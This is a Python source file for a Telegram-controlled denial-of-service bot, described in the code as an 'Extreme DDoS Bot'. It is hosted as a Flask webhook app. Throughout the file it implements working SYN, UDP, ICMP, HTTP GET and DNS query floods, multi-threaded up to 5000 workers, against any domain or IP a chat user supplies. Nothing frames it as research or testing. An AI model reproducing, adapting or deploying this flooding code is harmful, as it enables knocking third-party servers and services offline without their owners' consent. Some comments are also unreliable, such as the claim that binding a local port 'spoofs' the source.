#!/usr/bin/env python3
"""
🔥 EXTREME DDoS Bot - Multi-Layer Attack Orchestrator
Render Web App + Telegram Webhook Integration
"""
import os
import sys
import json
import logging
import threading
import time
import socket
import random
import string
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, Tuple, Optional
from dotenv import load_dotenv
from functools import wraps

from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, ContextTypes
from telegram.constants import ChatAction
from telegram.error import TelegramError

# Load environment
load_dotenv()

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Config from .env
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
PORT = int(os.getenv("PORT", 10000))
ENVIRONMENT = os.getenv("ENVIRONMENT", "development")
AUTHORIZED_USERS = list(map(int, os.getenv("AUTHORIZED_USERS", "").split(","))) if os.getenv("AUTHORIZED_USERS") else []
MAX_THREADS = int(os.getenv("MAX_THREADS", 5000))
MAX_DURATION = int(os.getenv("MAX_DURATION", 3600))

if not TELEGRAM_BOT_TOKEN:
    raise ValueError("❌ TELEGRAM_BOT_TOKEN required")

# Storage
MEMORY_FILE = "bot_memory.json"
ATTACKS_FILE = "active_attacks.json"

# ============================================================================
# MEMORY MANAGEMENT
# ============================================================================

class BotMemory:
    """Advanced user memory management"""
    
    @staticmethod
    def load():
        """Load memory"""
        if Path(MEMORY_FILE).exists():
            try:
                with open(MEMORY_FILE, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Memory load error: {e}")
                return {}
        return {}
    
    @staticmethod
    def save(data):
        """Save memory"""
        try:
            with open(MEMORY_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Memory save error: {e}")
    
    @staticmethod
    def get_user(user_id):
        """Get user data"""
        memory = BotMemory.load()
        return memory.get(str(user_id), {
            "user_id": user_id,
            "username": "unknown",
            "attacks": 0,
            "packets_sent": 0,
            "total_duration": 0,
            "favorite_target": None,
            "favorite_type": None,
            "created_at": datetime.now().isoformat(),
            "last_attack": None,
            "authorization": "pending"
        })
    
    @staticmethod
    def update_user(user_id, data):
        """Update user"""
        memory = BotMemory.load()
        memory[str(user_id)] = data
        BotMemory.save(memory)

# ============================================================================
# ATTACK ORCHESTRATION - EXTREME POWER
# ============================================================================

class ExtremeAttackManager:
    """Extreme DDoS - Multi-layer socket warfare"""
    
    def __init__(self):
        self.active_attacks: Dict[int, dict] = {}
        self.lock = threading.Lock()
        self.stats = {
            "total_packets": 0,
            "total_attacks": 0,
            "concurrent_attacks": 0
        }
    
    # ========== VOLUMETRIC LAYER ==========
    
    def syn_flood_worker(self, target_ip: str, target_port: int, user_id: int, intensity: int):
        """TCP SYN Flood - Extreme"""
        attack = self.active_attacks.get(user_id)
        if not attack:
            return
        
        packets = 0
        local_ports = list(range(50000, 65535))
        
        while attack.get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.2)
                
                # Spoof source port
                try:
                    sock.bind(("0.0.0.0", random.choice(local_ports)))
                except:
                    pass
                
                try:
                    sock.connect_ex((target_ip, target_port))
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
                
                packets += 1
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packets
                        self.stats['total_packets'] += 1
                
                # Intensity control
                if intensity < 2:
                    time.sleep(0.002)
                elif intensity < 3:
                    time.sleep(0.001)
            
            except Exception as e:
                pass
    
    def udp_flood_worker(self, target_ip: str, target_port: int, user_id: int, intensity: int):
        """UDP Flood - Extreme bandwidth"""
        attack = self.active_attacks.get(user_id)
        if not attack:
            return
        
        packets = 0
        payload_sizes = [64, 128, 256, 512, 1024, 1472]
        
        while attack.get('active', False):
            try:
                # Random payload
                payload_size = random.choice(payload_sizes) if intensity > 2 else 512
                payload = os.urandom(payload_size)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (target_ip, target_port))
                sock.close()
                
                packets += 1
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packets
                        self.stats['total_packets'] += 1
                
                # Intensity sleep
                if intensity < 2:
                    time.sleep(0.001)
            
            except Exception as e:
                pass
    
    def icmp_flood_worker(self, target_ip: str, user_id: int, intensity: int):
        """ICMP Echo Flood (Ping flood)"""
        attack = self.active_attacks.get(user_id)
        if not attack:
            return
        
        packets = 0
        
        while attack.get('active', False):
            try:
                # Create ICMP echo request (simplified)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                payload = b"X" * random.randint(32, 1472)
                
                try:
                    sock.sendto(payload, (target_ip, 0))
                    packets += 1
                except:
                    pass
                finally:
                    sock.close()
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packets
                        self.stats['total_packets'] += 1
                
            except PermissionError:
                # Fallback to UDP ping
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(b"X" * 256, (target_ip, 33434))
                    packets += 1
                    sock.close()
                except:
                    pass
    
    # ========== PROTOCOL LAYER ==========
    
    def http_flood_worker(self, target_host: str, target_port: int, user_id: int, intensity: int):
        """HTTP GET Flood - Application layer attack"""
        try:
            target_ip = socket.gethostbyname(target_host)
        except:
            return
        
        attack = self.active_attacks.get(user_id)
        if not attack:
            return
        
        packets = 0
        paths = ["/", "/index.html", "/api", "/search", "/admin", "/login", "/upload"]
        
        while attack.get('active', False):
            try:
                path = random.choice(paths) if intensity > 2 else "/"
                
                request_data = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target_host}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"DNT: 1\r\n"
                    f"Connection: close\r\n"
                    f"Upgrade-Insecure-Requests: 1\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"\r\n"
                ).encode()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                sock.sendall(request_data)
                sock.close()
                
                packets += 1
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packets
                        self.stats['total_packets'] += 1
            
            except Exception as e:
                pass
    
    def dns_flood_worker(self, target_ip: str, target_port: int, user_id: int, intensity: int):
        """DNS Query Flood (port 53)"""
        attack = self.active_attacks.get(user_id)
        if not attack:
            return
        
        packets = 0
        domains = ["test", "admin", "mail", "ftp", "www", "api", "db"]
        
        while attack.get('active', False):
            try:
                # Simple DNS query format
                domain = random.choice(domains)
                dns_query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                dns_query += domain.encode() + b"\x00\x00\x01\x00\x01"
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(dns_query, (target_ip, 53))
                sock.close()
                
                packets += 1
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packets
                        self.stats['total_packets'] += 1
            
            except:
                pass
    
    # ========== ORCHESTRATION ==========
    
    def start_attack(self, user_id: int, target: str, attack_type: str, threads: int, intensity: int = 2, duration: int = 60) -> Tuple[bool, str]:
        """Start multi-layer attack"""
        try:
            # Validate
            if threads < 100 or threads > MAX_THREADS:
                return False, f"❌ Threads: 100-{MAX_THREADS}"
            
            if duration < 10 or duration > MAX_DURATION:
                return False, f"❌ Duration: 10-{MAX_DURATION}s"
            
            if intensity < 1 or intensity > 5:
                return False, "❌ Intensity: 1-5"
            
            # Parse target
            if ':' in target:
                target_host, port_str = target.rsplit(':', 1)
                try:
                    target_port = int(port_str)
                except:
                    target_port = 80
            else:
                target_host = target
                target_port = 80 if attack_type in ['http', 'dns'] else random.randint(10000, 65535)
            
            # Resolve IP
            try:
                target_ip = socket.gethostbyname(target_host)
                logger.info(f"🎯 Resolved {target_host} -> {target_ip}")
            except socket.gaierror:
                return False, "❌ DNS resolution failed"
            
            # Attack type validation
            valid_types = ['syn', 'udp', 'icmp', 'http', 'dns', 'multi']
            if attack_type not in valid_types:
                return False, f"❌ Type: {', '.join(valid_types)}"
            
            # Create attack context
            with self.lock:
                self.active_attacks[user_id] = {
                    'target': target_host,
                    'ip': target_ip,
                    'port': target_port,
                    'type': attack_type,
                    'intensity': intensity,
                    'active': True,
                    'packets': 0,
                    'start_time': time.time(),
                    'threads': threads,
                    'duration': duration,
                    'worker_threads': []
                }
                self.stats['concurrent_attacks'] += 1
                self.stats['total_attacks'] += 1
            
            # Worker selection
            worker_map = {
                'syn': self.syn_flood_worker,
                'udp': self.udp_flood_worker,
                'icmp': self.icmp_flood_worker,
                'http': self.http_flood_worker,
                'dns': self.dns_flood_worker
            }
            
            # Spawn threads
            attack_ctx = self.active_attacks[user_id]
            
            if attack_type == 'multi':
                # Multi-layer attack
                layer_distribution = {
                    'syn': threads // 3,
                    'udp': threads // 3,
                    'http': threads // 3
                }
                
                for layer_type, layer_threads in layer_distribution.items():
                    worker = worker_map[layer_type]
                    for i in range(layer_threads):
                        if layer_type == 'http':
                            t = threading.Thread(target=worker, args=(target_host, target_port, user_id, intensity), daemon=True)
                        else:
                            t = threading.Thread(target=worker, args=(target_ip, target_port, user_id, intensity), daemon=True)
                        t.start()
                        attack_ctx['worker_threads'].append(t)
            else:
                # Single layer
                worker = worker_map[attack_type]
                for i in range(threads):
                    if attack_type == 'http':
                        t = threading.Thread(target=worker, args=(target_host, target_port, user_id, intensity), daemon=True)
                    else:
                        t = threading.Thread(target=worker, args=(target_ip, target_port, user_id, intensity), daemon=True)
                    t.start()
                    attack_ctx['worker_threads'].append(t)
            
            # Auto-stop timer
            def auto_stop():
                time.sleep(duration)
                self.stop_attack(user_id)
            
            timer_thread = threading.Thread(target=auto_stop, daemon=True)
            timer_thread.start()
            
            msg = (
                f"🚀 **ATTACK DEPLOYED**\n\n"
                f"🎯 Target: `{target_host}:{target_port}`\n"
                f"📍 IP: `{target_ip}`\n"
                f"⚔️ Type: `{attack_type.upper()}`\n"
                f"💪 Intensity: `{intensity}/5`\n"
                f"🧵 Threads: `{threads}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"📊 Status: **ACTIVE**"
            )
            
            return True, msg
        
        except Exception as e:
            logger.error(f"Attack error: {e}")
            return False, f"❌ Error: {str(e)}"
    
    def stop_attack(self, user_id: int) -> Tuple[bool, dict]:
        """Stop attack"""
        with self.lock:
            if user_id not in self.active_attacks:
                return False, {}
            
            attack = self.active_attacks[user_id]
            attack['active'] = False
            duration = time.time() - attack['start_time']
            packets = attack.get('packets', 0)
            pps = int(packets / max(duration, 1))
            
            stats = {
                'packets': packets,
                'duration': int(duration),
                'pps': pps,
                'mbps': int((packets * 512 * 8) / (1000000 * max(duration, 1)))
            }
            
            # Wait for threads
            for t in attack.get('worker_threads', []):
                try:
                    t.join(timeout=0.5)
                except:
                    pass
            
            self.stats['concurrent_attacks'] = max(0, self.stats['concurrent_attacks'] - 1)
            del self.active_attacks[user_id]
            
            return True, stats
    
    def get_status(self, user_id: int) -> dict:
        """Get attack status"""
        with self.lock:
            if user_id not in self.active_attacks:
                return {'active': False}
            
            attack = self.active_attacks[user_id]
            duration = time.time() - attack['start_time']
            packets = attack.get('packets', 0)
            pps = int(packets / max(duration, 1))
            mbps = int((packets * 512 * 8) / (1000000 * max(duration, 1)))
            
            return {
                'active': True,
                'target': attack['target'],
                'ip': attack['ip'],
                'port': attack['port'],
                'type': attack['type'],
                'intensity': attack['intensity'],
                'packets': packets,
                'duration': int(duration),
                'pps': pps,
                'mbps': mbps,
                'threads': attack['threads'],
                'remaining': max(0, attack['duration'] - int(duration))
            }

# Global manager
attack_mgr = ExtremeAttackManager()

# ============================================================================
# TELEGRAM BOT HANDLERS
# ============================================================================

def auth_required(func):
    """Authorization decorator"""
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        
        if AUTHORIZED_USERS and user_id not in AUTHORIZED_USERS:
            await update.message.reply_text("❌ Unauthorized. Contact admin.")
            return
        
        return await func(update, context, *args, **kwargs)
    return wrapper

@auth_required
async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    user_data = BotMemory.get_user(user_id)
    user_data['username'] = update.effective_user.username or "anonymous"
    BotMemory.update_user(user_id, user_data)
    
    keyboard = [
        [
            InlineKeyboardButton("🎯 DDoS Attack", callback_data="ddos_mode"),
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
        ],
        [
            InlineKeyboardButton("🛑 Stop", callback_data="stop_attack"),
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ],
        [
            InlineKeyboardButton("⚙️ Advanced", callback_data="advanced"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "⚡ **EXTREME DDoS Bot v3.0**\n\n"
        "**Multi-Layer Attack Orchestrator**\n\n"
        "🔥 Features:\n"
        "• TCP SYN Flood\n"
        "• UDP Volumetric\n"
        "• HTTP Application Layer\n"
        "• DNS Query Flood\n"
        "• Multi-layer Combined\n\n"
        "📊 Real-time metrics\n"
        "🎯 Advanced targeting\n"
        "⚙️ Full control\n\n"
        "🚀 Ready to deploy",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

@auth_required
async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    await update.message.reply_text(
        "**Attack Types:**\n"
        "`syn` - TCP SYN Flood (connection)\n"
        "`udp` - UDP Flood (volumetric)\n"
        "`icmp` - ICMP Ping Flood\n"
        "`http` - HTTP GET Flood\n"
        "`dns` - DNS Query Flood\n"
        "`multi` - All layers combined\n\n"
        "**Parameters:**\n"
        "Threads: 100-5000\n"
        "Intensity: 1-5\n"
        "Duration: 10-3600s\n\n"
        "**Examples:**\n"
        "`target.com`\n"
        "`192.168.1.1:8080`\n"
        "`target.com:443`",
        parse_mode="Markdown"
    )

@auth_required
async def status_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Status command"""
    user_id = update.effective_user.id
    status = attack_mgr.get_status(user_id)
    
    if status['active']:
        msg = (
            f"📊 **LIVE ATTACK**\n\n"
            f"🎯 Target: `{status['target']}:{status['port']}`\n"
            f"📍 IP: `{status['ip']}`\n"
            f"⚔️ Type: `{status['type'].upper()}`\n"
            f"💪 Intensity: `{status['intensity']}/5`\n"
            f"📤 Packets: `{status['packets']:,}`\n"
            f"💨 PPS: `{status['pps']:,}`\n"
            f"📈 Mbps: `{status['mbps']}`\n"
            f"⏱️ Running: `{status['duration']}s`\n"
            f"⏲️ Remaining: `{status['remaining']}s`\n"
            f"🧵 Threads: `{status['threads']}`"
        )
    else:
        user_data = BotMemory.get_user(user_id)
        msg = (
            f"📊 **Account Statistics**\n\n"
            f"👤 User: `{user_data.get('username', 'unknown')}`\n"
            f"🎨 Total Attacks: `{user_data.get('attacks', 0)}`\n"
            f"📤 Packets Sent: `{user_data.get('packets_sent', 0):,}`\n"
            f"⏱️ Total Duration: `{user_data.get('total_duration', 0)}s`\n"
            f"🎯 Favorite Target: `{user_data.get('favorite_target', 'none')}`\n"
            f"⚔️ Favorite Type: `{user_data.get('favorite_type', 'none')}`"
        )
    
    await update.message.reply_text(msg, parse_mode="Markdown")

@auth_required
async def stop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop command"""
    user_id = update.message.from_user.id
    success, stats = attack_mgr.stop_attack(user_id)
    
    if success:
        msg = (
            f"🛑 **ATTACK STOPPED**\n\n"
            f"📤 Packets: `{stats['packets']:,}`\n"
            f"⏱️ Duration: `{stats['duration']}s`\n"
            f"💨 PPS: `{stats['pps']:,}`\n"
            f"📈 Mbps: `{stats['mbps']}`"
        )
        
        # Update user memory
        user_data = BotMemory.get_user(user_id)
        user_data['attacks'] = user_data.get('attacks', 0) + 1
        user_data['packets_sent'] = user_data.get('packets_sent', 0) + stats['packets']
        user_data['total_duration'] = user_data.get('total_duration', 0) + stats['duration']
        user_data['last_attack'] = datetime.now().isoformat()
        BotMemory.update_user(user_id, user_data)
    else:
        msg = "❌ No active attack"
    
    await update.message.reply_text(msg, parse_mode="Markdown")

@auth_required
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Inline button callbacks"""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "ddos_mode":
        await query.edit_message_text(
            "🎯 **Enter Target**\n\n"
            "Domain or IP:\n"
            "`target.com`\n"
            "`192.168.1.1:8080`\n"
            "`api.example.com:443`"
        )
        context.user_data['waiting_for_target'] = True
    
    elif query.data == "stats":
        status = attack_mgr.get_status(user_id)
        if status['active']:
            msg = (
                f"📊 **LIVE**\n"
                f"🎯 `{status['target']}:{status['port']}`\n"
                f"📤 `{status['packets']:,}` packets\n"
                f"💨 `{status['pps']:,}` PPS\n"
                f"📈 `{status['mbps']}` Mbps\n"
                f"⏱️ `{status['duration']}s`"
            )
        else:
            msg = "❌ No active attack"
        
        await query.edit_message_text(msg, parse_mode="Markdown")
    
    elif query.data == "stop_attack":
        success, stats = attack_mgr.stop_attack(user_id)
        if success:
            msg = (
                f"🛑 **Stopped**\n"
                f"📤 `{stats['packets']:,}` packets\n"
                f"⏱️ `{stats['duration']}s`"
            )
        else:
            msg = "❌ No attack"
        
        await query.edit_message_text(msg, parse_mode="Markdown")
    
    elif query.data == "help":
        await query.edit_message_text(
            "**Types:** syn | udp | icmp | http | dns | multi\n"
            "**Threads:** 100-5000\n"
            "**Intensity:** 1-5\n"
            "**Duration:** 10-3600s"
        )
    
    elif query.data == "advanced":
        await query.edit_message_text(
            "⚙️ **Advanced Options**\n\n"
            "Set custom parameters:\n"
            "`/attack target.com syn 500 3 120`\n\n"
            "Format:\n"
            "`target type threads intensity duration`"
        )

@auth_required
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    user_id = update.message.from_user.id
    text = update.message.text.strip()
    
    # Parse /attack command
    if text.startswith('/attack '):
        parts = text[8:].split()
        if len(parts) < 2:
            await update.message.reply_text("❌ Format: `/attack target type [threads] [intensity] [duration]`", parse_mode="Markdown")
            return
        
        target = parts[0]
        attack_type = parts[1].lower()
        threads = int(parts[2]) if len(parts) > 2 else 500
        intensity = int(parts[3]) if len(parts) > 3 else 2
        duration = int(parts[4]) if len(parts) > 4 else 60
        
        success, msg = attack_mgr.start_attack(user_id, target, attack_type, threads, intensity, duration)
        await update.message.reply_text(msg, parse_mode="Markdown")
        return
    
    # Wait for target
    if context.user_data.get('waiting_for_target'):
        context.user_data['target'] = text
        context.user_data['waiting_for_target'] = False
        context.user_data['waiting_for_type'] = True
        
        await update.message.reply_text(
            f"✅ Target: `{text}`\n\n"
            "**Choose attack type:**\n"
            "`syn` `udp` `icmp` `http` `dns` `multi`",
            parse_mode="Markdown"
        )
    
    # Wait for type
    elif context.user_data.get('waiting_for_type'):
        attack_type = text.lower().strip()
        
        if attack_type not in ['syn', 'udp', 'icmp', 'http', 'dns', 'multi']:
            await update.message.reply_text("❌ Invalid type", parse_mode="Markdown")
            return
        
        context.user_data['type'] = attack_type
        context.user_data['waiting_for_type'] = False
        context.user_data['waiting_for_threads'] = True
        
        await update.message.reply_text(
            f"✅ Type: `{attack_type}`\n\n"
            "**Threads?** (100-5000, default: 500)\n"
            "Or type `go` for quick start",
            parse_mode="Markdown"
        )
    
    # Wait for threads
    elif context.user_data.get('waiting_for_threads'):
        threads = 500
        
        if text.lower() != 'go':
            try:
                threads = int(text)
            except:
                await update.message.reply_text("❌ Enter number or 'go'")
                return
        
        context.user_data['waiting_for_threads'] = False
        context.user_data['waiting_for_intensity'] = True
        
        await update.message.reply_text(
            f"✅ Threads: `{threads}`\n\n"
            "**Intensity?** (1-5, default: 2)\n"
            "Or type `go`",
            parse_mode="Markdown"
        )
    
    # Wait for intensity
    elif context.user_data.get('waiting_for_intensity'):
        intensity = 2
        
        if text.lower() != 'go':
            try:
                intensity = int(text)
                if intensity < 1 or intensity > 5:
                    await update.message.reply_text("❌ Range: 1-5")
                    return
            except:
                await update.message.reply_text("❌ Enter number or 'go'")
                return
        
        context.user_data['waiting_for_intensity'] = False
        context.user_data['waiting_for_duration'] = True
        
        await update.message.reply_text(
            f"✅ Intensity: `{intensity}`\n\n"
            "**Duration?** (10-3600s, default: 60)\n"
            "Or type `go`",
            parse_mode="Markdown"
        )
    
    # Wait for duration
    elif context.user_data.get('waiting_for_duration'):
        duration = 60
        
        if text.lower() != 'go':
            try:
                duration = int(text)
            except:
                await update.message.reply_text("❌ Enter number or 'go'")
                return
        
        context.user_data['waiting_for_duration'] = False
        
        # Launch attack
        target = context.user_data['target']
        attack_type = context.user_data['type']
        threads = context.user_data.get('threads', 500)
        intensity = context.user_data.get('intensity', 2)
        
        success, msg = attack_mgr.start_attack(user_id, target, attack_type, threads, intensity, duration)
        
        if success:
            user_data = BotMemory.get_user(user_id)
            user_data['favorite_target'] = target
            user_data['favorite_type'] = attack_type
            BotMemory.update_user(user_id, user_data)
        
        await update.message.reply_text(msg, parse_mode="Markdown")

# ============================================================================
# FLASK WEBHOOK APP
# ============================================================================

app = Flask(__name__)
telegram_app = None

@app.route('/', methods=['GET'])
def health():
    """Health check"""
    return jsonify({
        'status': 'running',
        'bot': 'Extreme DDoS Orchestrator v3.0',
        'timestamp': datetime.now().isoformat(),
        'concurrent_attacks': attack_mgr.stats['concurrent_attacks'],
        'total_packets': attack_mgr.stats['total_packets']
    }), 200

@app.route('/webhook', methods=['POST'])
async def webhook():
    """Telegram webhook"""
    try:
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        await telegram_app.process_update(update)
        return jsonify({'ok': True}), 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/stats', methods=['GET'])
def get_stats():
    """Get bot stats"""
    return jsonify({
        'concurrent_attacks': attack_mgr.stats['concurrent_attacks'],
        'total_packets': attack_mgr.stats['total_packets'],
        'total_attacks': attack_mgr.stats['total_attacks'],
        'timestamp': datetime.now().isoformat()
    }), 200

async def setup_webhook():
    """Setup webhook"""
    global telegram_app
    
    telegram_app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    from telegram.ext import CommandHandler, MessageHandler, CallbackQueryHandler, filters
    
    telegram_app.add_handler(CommandHandler("start", start_handler))
    telegram_app.add_handler(CommandHandler("help", help_handler))
    telegram_app.add_handler(CommandHandler("status", status_handler))
    telegram_app.add_handler(CommandHandler("stop", stop_handler))
    telegram_app.add_handler(CallbackQueryHandler(handle_callback))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    await telegram_app.initialize()
    
    webhook_url = f"{WEBHOOK_URL}/webhook"
    await telegram_app.bot.set_webhook(url=webhook_url, allowed_updates=['message', 'callback_query'])
    logger.info(f"✅ Webhook: {webhook_url}")

import asyncio

def main():
    """Start server"""
    asyncio.run(setup_webhook())
    
    logger.info(f"🚀 Bot running on 0.0.0.0:{PORT}")
    logger.info(f"📍 Webhook: {WEBHOOK_URL}/webhook")
    logger.info(f"🌍 Environment: {ENVIRONMENT}")
    
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    main()
